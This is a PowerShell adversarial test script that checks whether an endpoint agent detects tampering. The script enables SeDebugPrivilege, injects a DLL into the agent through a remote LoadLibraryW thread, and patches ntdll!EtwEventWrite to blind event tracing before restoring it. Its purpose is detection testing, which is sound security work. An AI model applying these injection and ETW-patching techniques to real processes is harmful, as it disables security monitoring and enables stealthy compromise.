<#
Adversarial rows T6/T7 (Windows), run elevated on a test host:
  T6  load a DLL into the agent process (remote LoadLibraryW thread)
  T7  patch the first byte of ntdll!EtwEventWrite inside the agent (ret), then restore it

Expected findings (within ~60 s each):
  T6  selfprotect.module_injected   (module path outside System32 / install dir)
      selfprotect.handle_access      (this PowerShell process held VM_WRITE / CREATE_THREAD)
  T7  selfprotect.code_patched      (subject ntdll.dll!EtwEventWrite, expected vs actual bytes)

Safety: refuses to run unless TRAPD_ADVERSARIAL_OK=1. The DLL is a copy of a
Microsoft-signed system DLL (version.dll) placed in a temp dir and removed at
the end; the ETW patch is one byte and is restored from the saved original.
The agent's process DACL needs SeDebugPrivilege: the script enables it.
With TRAPD_MITIGATION_SIGNATURE=enforce a non-Microsoft DLL is refused by the
loader (no module finding); the copy used here is Microsoft-signed on purpose so
the audit/enforce modes can be told apart in the event log instead.
#>
$ErrorActionPreference = 'Stop'
if ($env:TRAPD_ADVERSARIAL_OK -ne '1') {
  Write-Error 'refusing to run: set TRAPD_ADVERSARIAL_OK=1 (this tampers with the local agent on purpose)'
  exit 2
}
$svc = Get-CimInstance Win32_Service -Filter "Name='TRAPD Agent' OR Name='trapd-agent'" | Select-Object -First 1
if (-not $svc -or -not $svc.ProcessId) { Write-Error 'agent service not running'; exit 1 }
$agentPid = [int]$svc.ProcessId

Add-Type -TypeDefinition @'
using System; using System.Runtime.InteropServices;
public static class Adv {
  [DllImport("kernel32.dll", SetLastError=true)] public static extern IntPtr OpenProcess(uint a, bool i, int pid);
  [DllImport("kernel32.dll", SetLastError=true)] public static extern bool CloseHandle(IntPtr h);
  [DllImport("kernel32.dll", SetLastError=true)] public static extern IntPtr VirtualAllocEx(IntPtr p, IntPtr a, UIntPtr s, uint t, uint pr);
  [DllImport("kernel32.dll", SetLastError=true)] public static extern bool WriteProcessMemory(IntPtr p, IntPtr a, byte[] b, UIntPtr s, out UIntPtr w);
  [DllImport("kernel32.dll", SetLastError=true)] public static extern bool ReadProcessMemory(IntPtr p, IntPtr a, byte[] b, UIntPtr s, out UIntPtr r);
  [DllImport("kernel32.dll", SetLastError=true)] public static extern bool VirtualProtectEx(IntPtr p, IntPtr a, UIntPtr s, uint n, out uint o);
  [DllImport("kernel32.dll", SetLastError=true)] public static extern IntPtr CreateRemoteThread(IntPtr p, IntPtr sa, UIntPtr ss, IntPtr start, IntPtr param, uint f, out uint id);
  [DllImport("kernel32.dll")] public static extern IntPtr GetModuleHandle(string n);
  [DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr m, string n);
  [DllImport("kernel32.dll")] public static extern uint WaitForSingleObject(IntPtr h, uint ms);
}
'@
# SeDebugPrivilege (the agent's process DACL denies even elevated admins otherwise).
$sig = '[DllImport("ntdll.dll")] public static extern int RtlAdjustPrivilege(int p, bool e, bool t, out bool o);'
Add-Type -MemberDefinition $sig -Name Priv -Namespace Adv | Out-Null
$o = $false; [void][Adv.Priv]::RtlAdjustPrivilege(20, $true, $false, [ref]$o)

$ALL = 0x1F0FFF
$h = [Adv]::OpenProcess($ALL, $false, $agentPid)
if ($h -eq [IntPtr]::Zero) { Write-Error "OpenProcess failed (run elevated)"; exit 1 }
$work = Join-Path $env:TEMP ("trapd-adv-" + [guid]::NewGuid())
New-Item -ItemType Directory $work | Out-Null
try {
  # ---- T6: remote LoadLibraryW of a copied, signed system DLL -------------------
  $dll = Join-Path $work 'version.dll'
  Copy-Item "$env:SystemRoot\System32\version.dll" $dll
  $bytes = [Text.Encoding]::Unicode.GetBytes($dll + "`0")
  $mem = [Adv]::VirtualAllocEx($h, [IntPtr]::Zero, [UIntPtr][uint64]$bytes.Length, 0x3000, 0x04)
  $w = [UIntPtr]::Zero
  [void][Adv]::WriteProcessMemory($h, $mem, $bytes, [UIntPtr][uint64]$bytes.Length, [ref]$w)
  $ll = [Adv]::GetProcAddress([Adv]::GetModuleHandle('kernel32.dll'), 'LoadLibraryW')
  $tid = 0
  $t = [Adv]::CreateRemoteThread($h, [IntPtr]::Zero, [UIntPtr]::Zero, $ll, $mem, 0, [ref]$tid)
  [void][Adv]::WaitForSingleObject($t, 5000)
  Write-Host "T6: injected $dll into pid $agentPid (thread $tid); keep handle open 70 s for the handle watch"

  # ---- T7: patch EtwEventWrite (same ntdll base in every process this boot) -----
  $etw = [Adv]::GetProcAddress([Adv]::GetModuleHandle('ntdll.dll'), 'EtwEventWrite')
  $orig = New-Object byte[] 1; $r = [UIntPtr]::Zero
  [void][Adv]::ReadProcessMemory($h, $etw, $orig, [UIntPtr][uint64]1, [ref]$r)
  $old = [uint32]0
  [void][Adv]::VirtualProtectEx($h, $etw, [UIntPtr][uint64]1, 0x40, [ref]$old)
  [void][Adv]::WriteProcessMemory($h, $etw, [byte[]](0xC3), [UIntPtr][uint64]1, [ref]$w)
  Write-Host ("T7: patched EtwEventWrite at 0x{0:X} (orig byte 0x{1:X2}); waiting 75 s" -f [int64]$etw, $orig[0])
  Start-Sleep -Seconds 75
  [void][Adv]::WriteProcessMemory($h, $etw, $orig, [UIntPtr][uint64]1, [ref]$w)
  [void][Adv]::VirtualProtectEx($h, $etw, [UIntPtr][uint64]1, $old, [ref]$old)
  Write-Host 'T7: restored original byte'
} finally {
  [void][Adv]::CloseHandle($h)
  # The injected copy stays mapped until the agent restarts; the file is removed
  # best-effort (it cannot be deleted while mapped).
  Remove-Item $work -Recurse -Force -ErrorAction SilentlyContinue
  Write-Host 'Restart the agent service afterwards to unload the injected DLL.'
}
Write-Host 'Verify: findings selfprotect.module_injected, selfprotect.handle_access, selfprotect.code_patched'
